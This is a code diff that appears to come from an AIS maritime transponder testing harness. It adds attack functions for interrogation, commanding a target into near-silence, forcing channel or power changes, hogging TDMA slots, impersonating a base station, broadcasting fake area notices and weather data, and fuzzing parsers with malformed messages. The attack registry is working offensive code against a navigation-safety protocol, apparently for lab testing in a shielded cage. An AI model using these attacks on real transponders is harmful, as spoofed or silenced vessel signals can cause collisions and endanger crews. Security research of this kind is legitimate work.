@@ -101,6 +101,101 @@ def collision_course():
     ], "Collision course: two vessels converging head-on."
 
 
+# --- command / control-message attacks (target a transponder's protocol behavior) ---
+DEST_MMSI = 247320152   # placeholder target; set to a transponder's MMSI in the cage
+BASE_STATION_MMSI = 2000000   # 00xxxxxxx = base station identity (source-validation tests)
+
+def interrogation():
+    """M15: ask the target to reply (with its Type 3/5). Tests if it answers an SDR."""
+    return [(enc.encode_type15(366000001, DEST_MMSI, msg1_1=5),
+             f"M15 interrogate {DEST_MMSI} for msg5")], \
+           "Interrogation (M15): request a reply from the target transponder."
+
+def rate_assignment():
+    """M16: assign a reporting rate/slot -> near-silence. Tests if the unit obeys."""
+    return [(enc.encode_type16(366000001, DEST_MMSI, offset_a=0, increment_a=0),
+             f"M16 assign {DEST_MMSI} rate 0")], \
+           "Rate assignment (M16): command near-silence on the target."
+
+def channel_mgmt():
+    """M22: force a channel/power change. Tests if the unit switches."""
+    return [(enc.encode_type22(366000001, addressed=1, dest1=DEST_MMSI, power=1),
+             f"M22 channel/power change addressed to {DEST_MMSI}")], \
+           "Channel management (M22): command a channel/power change on the target."
+
+def slot_reservation():
+    """M20: reserve many FATDMA slots (slot hogging via SDR)."""
+    return [(enc.encode_type20(366000001, offset1=0, slots1=5, timeout1=7),
+             "M20 reserve 5 slots")], \
+           "Slot reservation (M20): reserve slots to crowd out other stations."
+
+def base_vs_regular():
+    """Source validation: same interrogation from a base-station MMSI vs a regular one.
+    Send both; compare whether the target treats them differently."""
+    return [
+        (enc.encode_type15(BASE_STATION_MMSI, DEST_MMSI, msg1_1=5),
+         f"M15 from BASE {BASE_STATION_MMSI}"),
+        (enc.encode_type15(366000001, DEST_MMSI, msg1_1=5),
+         f"M15 from REGULAR 366000001"),
+    ], "Source validation: interrogation from base-station vs regular MMSI."
+
+def fake_area_notice():
+    """M8 broadcast binary, area-notice application (DAC=1, FID=22)."""
+    return [(enc.encode_type8(366000001, dac=1, fid=22, app_data_bits="0"*80),
+             "M8 area notice (dac1 fid22)")], \
+           "Fake area notice (M8): broadcast a binary area-notice message."
+
+def fake_met_hydro():
+    """M8 broadcast binary, meteorological/hydrological application (DAC=1, FID=11)."""
+    return [(enc.encode_type8(366000001, dac=1, fid=11, app_data_bits="0"*80),
+             "M8 met/hydro (dac1 fid11)")], \
+           "Fake met/hydro (M8): broadcast fake weather data."
+
+def auto_ack():
+    """M6 addressed binary to the target: does it auto-acknowledge?"""
+    return [(enc.encode_type6(366000001, DEST_MMSI, dac=1, fid=0, app_data_bits="0"*40),
+             f"M6 addressed to {DEST_MMSI}")], \
+           "Auto-ack (M6): addressed binary message; watch for an acknowledgement."
+
+# --- protocol-fuzzing / malformed attacks (probe parser robustness) ---
+def reserved_values():
+    """M1 with reserved/illegal field values: nav=13, SOG=1023, COG=4000, heading=511."""
+    return [(enc.encode_type1_raw(366000001, SPOOF_LAT, SPOOF_LON,
+                                  sog_u=1023, nav_status=13, cog_u=4000, heading=511),
+             "M1 reserved values nav13/sog1023/cog4000/hdg511")], \
+           "Reserved values: illegal nav status, SOG, COG, heading sentinels."
+
+def sentinels_misused():
+    """M1 with out-of-range position sentinels: lat=91, lon=181 (invalid coordinates)."""
+    return [(enc.encode_type1_raw(366000001, 91.0, 181.0),
+             "M1 lat=91 lon=181 (out of range)")], \
+           "Sentinels misused: out-of-range latitude/longitude."
+
+def spare_bits_nonzero():
+    """M1 with spare bits set to 1 (spec says they must be 0)."""
+    return [(enc.encode_type1_raw(366000001, SPOOF_LAT, SPOOF_LON, spare=7),
+             "M1 spare bits = 1")], \
+           "Spare bits nonzero: bits the spec requires to be zero are set."
+
+def undefined_msg_type():
+    """A message with an undefined/reserved type (28)."""
+    return [(enc.encode_undefined_type(28, 366000001),
+             "undefined message type 28")], \
+           "Undefined message ID: message type 28 (not defined in the spec)."
+
+def truncated_msg():
+    """A Type 1 truncated to 80 bits (incomplete message)."""
+    full = enc.encode_type1(366000001, SPOOF_LAT, SPOOF_LON)
+    return [(enc.make_truncated(full, 80), "M1 truncated to 80 bits")], \
+           "Truncated message: an incomplete Type 1 (may be rejected by the framer)."
+
+def oversized_msg():
+    """A Type 1 padded 40 bits beyond spec length."""
+    full = enc.encode_type1(366000001, SPOOF_LAT, SPOOF_LON)
+    return [(enc.make_oversized(full, 40), "M1 oversized +40 bits")], \
+           "Oversized message: a Type 1 longer than the spec (may overflow the slot)."
+
+
 ATTACKS = {
     "ghost_ship": ghost_ship,
     "impossible_jump": impossible_jump,
@@ -108,6 +203,22 @@ ATTACKS = {
     "fake_identity_sar": fake_identity_sar,
     "rapid_ghost_fleet": rapid_ghost_fleet,
     "collision_course": collision_course,
+    # command / control
+    "interrogation": interrogation,
+    "rate_assignment": rate_assignment,
+    "channel_mgmt": channel_mgmt,
+    "slot_reservation": slot_reservation,
+    "base_vs_regular": base_vs_regular,
+    "fake_area_notice": fake_area_notice,
+    "fake_met_hydro": fake_met_hydro,
+    "auto_ack": auto_ack,
+    # protocol fuzzing / malformed
+    "reserved_values": reserved_values,
+    "sentinels_misused": sentinels_misused,
+    "spare_bits_nonzero": spare_bits_nonzero,
+    "undefined_msg_type": undefined_msg_type,
+    "truncated_msg": truncated_msg,
+    "oversized_msg": oversized_msg,
 }
 
 
